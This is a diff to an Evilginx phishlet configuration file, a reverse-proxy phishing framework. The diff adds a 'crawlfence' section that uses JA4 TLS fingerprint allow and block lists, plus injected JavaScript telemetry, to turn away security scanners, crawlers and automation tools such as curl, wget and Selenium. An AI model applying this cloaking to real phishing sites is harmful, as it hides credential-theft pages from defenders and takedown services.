@@ -18,3 +18,41 @@ credentials:
 login:
   domain: 'academy.breakdev.org'
   path: '/evilginx-mastery'
+
+# Crawlfence - Bot detection using JA4 TLS fingerprinting and browser telemetry
+# This feature helps block automated scanners and security tools
+crawlfence:
+  enabled: true
+
+  # JA4 TLS Fingerprinting
+  # JA4 signatures are generated from TLS ClientHello packets
+  # Format: TLSVersion+SNI+CipherCount+ExtCount+ALPN_CipherHash_ExtHash
+  # Example: t13d1516h2_8daaf6152771_b0da82dd1658
+  ja4:
+    # Mode options:
+    #   'learn'  - Record JA4 signatures without blocking (view with: crawlfence ja4 <phishlet>)
+    #   'block'  - Enforce whitelist/blacklist rules
+    #   'off'    - Disable JA4 fingerprinting
+    mode: 'learn'
+
+    # Whitelist - Only allow these JA4 signatures (empty = allow all non-blacklisted)
+    # Use 'crawlfence ja4 <phishlet>' to see collected signatures in learn mode
+    whitelist: []
+    #  - 't13d1516h2_8daaf6152771_b0da82dd1658'  # Example: Chrome on Windows
+    #  - 't13d1715h2_8daaf6152771_e5627efa2ab1'  # Example: Chrome on macOS
+
+    # Blacklist - Block these JA4 signatures (takes precedence over whitelist)
+    blacklist: []
+    #  - 't13d0000h2_0000000000_0000000000'  # Example: Known scanner signature
+
+  # Browser Telemetry - JavaScript-based bot detection
+  # Injects script on landing pages to detect automation tools
+  telemetry:
+    enabled: true
+
+    # User-Agent blacklist patterns (regex)
+    # Built-in patterns already block: python, curl, wget, scrapy, go-http-client, etc.
+    # Built-in automation detection: HeadlessChrome, Puppeteer, Selenium, PhantomJS, etc.
+    ua_blacklist: []
+    #  - '(?i)custom-scanner'
+    #  - '(?i)security-tool'
